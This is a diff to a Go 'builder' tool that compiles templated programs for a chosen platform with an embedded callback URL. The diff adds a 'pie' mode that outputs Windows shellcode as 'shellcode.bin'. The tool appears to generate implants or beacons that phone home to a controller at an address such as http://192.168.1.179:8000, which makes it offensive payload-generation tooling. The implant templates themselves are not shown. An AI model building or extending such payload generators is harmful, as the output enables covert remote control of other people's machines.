@@ -1,4 +1,5 @@
 // Original code from https://levelup.gitconnected.com/writing-a-code-generator-in-go-420e69151ab1
+// Prod
 
 package main
 
@@ -12,8 +13,6 @@ import (
 	"strings"
 	"text/template"
 	"uuid"
-
-	"github.com/manifoldco/promptui"
 )
 
 var (
@@ -32,10 +31,12 @@ func main() {
 	uuidWithHyphen := uuid.New()
 	uuid := strings.Replace(uuidWithHyphen.String(), "-", "", -1)
 
-	if len(os.Args) < 5 {
-		fmt.Printf("Not enough arguments. Need platform, architecture, output file name, and callback URL \n")
+	if os.Args[1] == "help" {
+		fmt.Printf("Need platform, architecture, output file name, and callback URL >>> builder windows amd64 tempExe http://192.168.1.179:8000\n")
+		fmt.Printf("For a PIE, need platform, pie keyword, output file name, and callback URL >>> ./builder windows pie tempExe http://192.168.1.179:8000 \n")
 		os.Exit(1)
 	}
+
 	mydir, _ := os.Getwd()
 	var (
 		err       error
@@ -93,39 +94,36 @@ func main() {
 		}
 	}
 
-	fmt.Printf(" Done")
+	switch os.Args[2] {
+	case "pie":
+		fmt.Printf(" Generating PIE \n")
+		os.Setenv("GOOS", "windows")
+		os.Setenv("GOARCH", "amd64")
+		appNamePath := mydir + "/templates/" + values.AppName + ".go"
+		setEnvVarExec := exec.Command("go", "build", "-buildmode", "pie", "-o", "shellcode.bin", appNamePath)
+		out, err = setEnvVarExec.Output()
+		if err != nil {
+			log.Fatal(err)
+		}
+		res := string(out)
+		fmt.Printf(res)
+		fmt.Printf(" Done, output shellcode.bin \n")
 
-	// We set the app name and full path here for use later
-	appNamePath := mydir + "/templates/" + values.AppName + ".go"
+	default:
+		// We set the app name and full path here for use later
+		appNamePath := mydir + "/templates/" + values.AppName + ".go"
+		// we set these as global compile options
+		os.Setenv("GOOS", os.Args[1])
+		os.Setenv("GOARCH", os.Args[2])
 
-	// we set these as global compile options
-	os.Setenv("GOOS", os.Args[1])
-	os.Setenv("GOARCH", os.Args[2])
-
-	// after setting environment variables, we compile using go build and the path to the file
-	setEnvVar := exec.Command("go", "build", appNamePath)
-	out, err = setEnvVar.Output()
-	if err != nil {
-		log.Fatal(err)
+		// after setting environment variables, we compile using go build and the path to the file
+		setEnvVarExec := exec.Command("go", "build", appNamePath)
+		out, err = setEnvVarExec.Output()
+		if err != nil {
+			log.Fatal(err)
+		}
+		res := string(out)
+		fmt.Printf(res)
+		fmt.Printf(" Done \n")
 	}
-	res := string(out)
-	fmt.Printf(res)
-}
-
-func stringPrompt(label, defaultValue string) string {
-	var (
-		err    error
-		result string
-	)
-
-	prompt := promptui.Prompt{
-		Label:   label,
-		Default: defaultValue,
-	}
-
-	if result, err = prompt.Run(); err != nil {
-		log.Fatalln(err)
-	}
-
-	return result
 }
